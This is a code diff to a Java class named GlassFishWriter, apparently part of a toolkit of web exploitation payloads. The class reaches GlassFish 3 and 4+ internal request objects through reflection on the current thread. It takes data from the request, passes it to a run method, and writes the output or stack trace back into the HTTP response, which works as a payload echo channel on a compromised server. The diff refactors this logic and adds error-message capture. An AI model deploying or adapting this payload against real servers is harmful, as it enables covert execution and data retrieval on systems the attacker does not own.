@@ -1,5 +1,8 @@
 package com.reajason.javaweb.probe.payload.response;
 
+import java.io.ByteArrayOutputStream;
+import java.io.OutputStream;
+import java.io.PrintStream;
 import java.io.PrintWriter;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
@@ -22,10 +25,8 @@ public class GlassFishWriter {
                 // GlassFish3
                 Thread thread = Thread.currentThread();
                 Object request = invokeMethod(getFieldValue(getFieldValue(thread, "processorTask"), "request"), "getNote", new Class[]{Integer.TYPE}, new Object[]{1});
-                Object response = invokeMethod(request, "getResponse", null, null);
-                String data = getDataFromReq(request);
-                if (data != null && !data.isEmpty()) {
-                    execute(response, data);
+                if (tryWriteRes(request)) {
+                    return;
                 }
             } catch (Exception x) {
                 // GlassFish4+
@@ -48,10 +49,7 @@ public class GlassFishWriter {
                         }
                         Object notesHolder = getFieldValue(getFieldValue(coyoteRequest, "request"), "notesHolder");
                         Object request = invokeMethod(notesHolder, "getAttribute", new Class[]{String.class}, new Object[]{"org.apache.catalina.connector.Request"});
-                        Object response = invokeMethod(request, "getResponse", null, null);
-                        String data = getDataFromReq(request);
-                        if (data != null && !data.isEmpty()) {
-                            execute(response, data);
+                        if (tryWriteRes(request)) {
                             return;
                         }
                     }
@@ -64,15 +62,32 @@ public class GlassFishWriter {
         }
     }
 
-    private void execute(Object response, String data) throws Exception {
-        PrintWriter writer = (PrintWriter) invokeMethod(response, "getWriter", null, null);
-        try {
-            writer.write(run(data));
-        } catch (Throwable e) {
-            e.printStackTrace(writer);
+    private boolean tryWriteRes(Object request) throws Exception {
+        Object response = invokeMethod(request, "getResponse", null, null);
+        String data = getDataFromReq(request);
+        if (data != null && !data.isEmpty()) {
+            String result = "";
+            try {
+                result = run(data);
+            } catch (Throwable e) {
+                result = getErrorMessage(e);
+            }
+            if (result != null) {
+                try {
+                    OutputStream outputStream = (OutputStream) invokeMethod(response, "getOutputStream", null, null);
+                    outputStream.write(result.getBytes());
+                    outputStream.flush();
+                    outputStream.close();
+                } catch (Throwable e) {
+                    PrintWriter writer = (PrintWriter) invokeMethod(response, "getWriter", null, null);
+                    writer.write(result);
+                    writer.flush();
+                    writer.close();
+                }
+            }
+            return true;
         }
-        writer.flush();
-        writer.close();
+        return false;
     }
 
     private String getDataFromReq(Object request) throws Exception {
@@ -118,5 +133,20 @@ public class GlassFishWriter {
             }
         }
         throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
+    }
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
     }
 }
